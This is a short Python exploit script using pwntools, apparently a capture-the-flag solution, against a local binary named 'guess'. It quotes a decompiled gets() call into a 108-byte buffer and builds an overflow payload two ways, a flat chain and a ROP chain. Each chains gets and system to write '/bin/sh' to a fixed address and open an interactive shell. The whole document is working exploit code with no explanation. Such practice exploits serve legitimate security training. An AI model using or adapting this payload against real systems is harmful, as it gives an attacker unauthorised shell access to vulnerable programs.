"""
  char s[108]; //[ebp-6Ch]
  printf("Do you want to try it?");
  return gets(s);
"""
from pwn import *

s = process('./guess')
elf = ELF('./guess')

pad = 8 if elf.arch == 'amd64' else 4
padding = 0x6c
gets_plt = elf.plt['gets']
system_plt = elf.plt.system
buf2_addr = 0x804A080


def sh1():
    payload = flat('a' * (padding + pad), gets_plt, system_plt, buf2_addr, buf2_addr)
    s.sendline(payload)
    s.sendline('/bin/sh')


def sh2():
    rop = ROP(elf)
    rop.raw('a' * (padding + pad))
    rop.call('gets', [buf2_addr])
    rop.call('system', [buf2_addr])
    payload = rop.chain()
    s.sendline(payload)
    s.sendline('/bin/sh')


sh1()
# sh2()
s.interactive()
